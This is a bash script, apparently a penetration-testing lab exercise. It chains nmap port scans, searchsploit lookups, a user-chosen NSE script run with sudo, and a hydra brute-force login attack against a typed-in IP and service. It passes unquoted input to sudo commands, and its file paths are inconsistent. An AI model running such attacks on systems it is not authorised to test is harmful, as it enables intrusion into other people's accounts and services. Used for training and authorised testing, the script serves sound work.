function INPUT()  #this function is getting from the user ip range and make directory
{
	echo "pleas enter ip"
	read ip
	IP=$(echo $ip |cut -d '/' -f1)
	cd ~/Desktop
	directory=$(mkdir -p $IP)
	PATHE=~/Desktop/$IP
	echo "$PATHE"
	MAPPING
}

function MAPPING()   #this function is basiclly for nmap the usr chose how many ports he wants to scan 
{
	LOG
	read -p "choose renge of ports you want to scan 100 or 1000 or all: " range_of_ports
	echo "scanning"
	if [[ $range_of_ports == 100 ]] 
	then
		nmap -F $IP -oN ~/Desktop/nmap.txt -oX ~/Desktop/nmap.xml 1>/dev/null
		NSE
	elif [[ $range_of_ports == 1000 ]] 
	then
		nmap $IP -oN nmap.txt -oX nmap.xml 1>/dev/null
		NSE
	elif [[ $range_of_ports == "all" ]]
	then
		nmap $IP -p-  -oN nmap.txt -oX nmap.xml 1>/dev/null
		NSE
	else 
	echo "Invalid input. Only valid input are 100,1000,all"
	echo " I send you back to the start"
	MAPPING
	fi
	
}



function NSE()   #this function is for serachsploit and nmap nsc the user need to decide wich script he wants.
{
LOG

echo "Using Searchsploit to detect by vulnerabilities"
searchsploit -v --nmap nmap.xml > ~/Desktop/searchsploit.txt 2>&1
sudo nmap --script-updatedb
echo "now we run nse script"
sudo cp -r /usr/share/nmap/scripts  ~/Desktop/nse.txt
ls ~/Desktop/nse.txt
echo "choose NSE script from the list above "
read script
sudo nmap --script=$script $IP -d  >> ~/Desktop/nmap-script-scan.txt
BRUTFORCE

}


function BRUTFORCE()   #this function is asks from the user to mke two lists 1 of users  and one of password  and then hydra try to brut forc and hack to the system.
{

echo "enter a list of users, seperated by comma: for example (msfadmin,root)"
read user
echo $user | tr ',' '\n' > ~/Desktop/user.txt
echo "enter a list of passwords, seperated by comma : for example (name,12345)"
read password
echo $password | tr ',' '\n' > ~/Desktop/password.txt
cat nmap.txt
echo "enter the name of the service you would like to brute force (aka ftp/ ssh /SMB  etc)"
read  service
echo "enter the ip address you would like to brute force: "
read ip
hydra -L ~/Desktop/user.txt -P ~/Desktop/password.txt $ip  $service  -o hydra.txt 1>/dev/null
mv nmap.txt nmap.xml searchsploit.txt nmap-script-scan.txt user.txt password.txt ~/Desktop/$IP
}

function LOG()
{
exec &> >(tee -a ~/Desktop/$IP/log.txt)
}
INPUT

